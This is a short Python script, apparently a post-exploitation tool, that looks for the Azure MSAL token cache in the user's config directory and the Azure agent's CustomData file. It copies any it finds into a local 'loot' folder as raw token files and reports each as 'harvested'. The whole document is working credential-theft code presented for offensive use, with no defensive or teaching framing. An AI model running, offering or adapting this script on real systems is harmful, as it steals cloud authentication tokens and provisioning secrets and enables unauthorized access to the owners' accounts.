import os, sys, glob
def rip():
    paths = [os.path.expanduser("~/.config/MSALCache.bin"), "/var/lib/waagent/Lib/CustomData"]
    for p in paths:
        if os.path.exists(p):
            with open(p, 'rb') as f:
                with open(f"../loot/azure_token_{os.getpid()}.raw", "wb") as l: l.write(f.read())
            print(f"[+] Artifact Harvested: {p}")
if __name__ == "__main__": rip()
